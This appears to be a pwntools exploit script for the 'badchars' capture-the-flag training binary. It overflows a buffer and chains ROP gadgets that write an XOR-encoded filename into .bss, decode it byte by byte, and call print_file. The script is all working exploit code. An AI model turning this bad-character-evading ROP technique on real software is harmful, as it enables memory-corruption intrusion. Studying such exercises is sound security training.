
from pwn import *

exe = './badchars'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
bss = p64(0x601500)
bs = 0x601500
print_file = p64(0x400510)
ret = p64(0x4004ee)
poprdi = p64(0x4006a3)
popr12_15 = p64(0x40069c)
r13 = p64(0x666c51571e744874)[::-1]
gadget = p64(0x400634)
gad2 = p64(0x400628)
pop15 = p64(0x4006a2)

p.sendline(40*b"A" + popr12_15 + r13 + bss + p64(0x30) + p64(bs+2) + gadget + 
            gad2 + pop15 + p64(bs+3) + 
            gad2 + pop15 + p64(bs+4) + 
            gad2 + pop15 + p64(bs+6) + 
            gad2 + ret + poprdi + bss + print_file)

p.interactive()

